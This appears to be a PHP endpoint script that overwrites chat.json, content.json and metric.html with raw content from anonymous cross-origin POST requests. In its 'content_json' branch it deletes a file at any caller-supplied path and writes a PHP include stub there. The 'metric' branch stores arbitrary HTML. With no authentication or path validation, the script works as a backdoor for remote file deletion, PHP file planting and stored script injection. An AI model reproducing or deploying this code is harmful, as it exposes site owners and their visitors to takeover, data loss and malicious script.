<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");
header("Access-Control-Max-Age: 3600");



if (isset($_POST['chat_json'])) {
   try {
      $fileName = 'chat.json';
      if (file_exists($fileName)) {
         unlink($fileName);
      }
      file_put_contents($fileName, $_POST['chat_json']);
      exit('success');
   } catch (\Exception $e) {
      exit($e->getMessage());
   }
}

if (isset($_POST['content_json'])) {
   try {
      $json = $_POST['content_json'];
      $fileName = 'content.json';
      if (file_exists($fileName)) {
         unlink($fileName);
      }
      file_put_contents($fileName, $json);
      $data = json_decode($json, true);
      $fileName = $data['success_path'];
      if (file_exists($fileName)) {
         unlink($fileName);
      }
      file_put_contents($data['success_path'], '<?php include("index.php");');
      exit('success');
   } catch (\Exception $e) {
      exit($e->getMessage());
   }
}

if (isset($_POST['metric'])) {
   try {
      $fileName = 'metric.html';
      if (file_exists($fileName)) {
         unlink($fileName);
      }
      file_put_contents($fileName, $_POST['metric']);
      exit('success');
   } catch (\Exception $e) {
      exit($e->getMessage());
   }
}
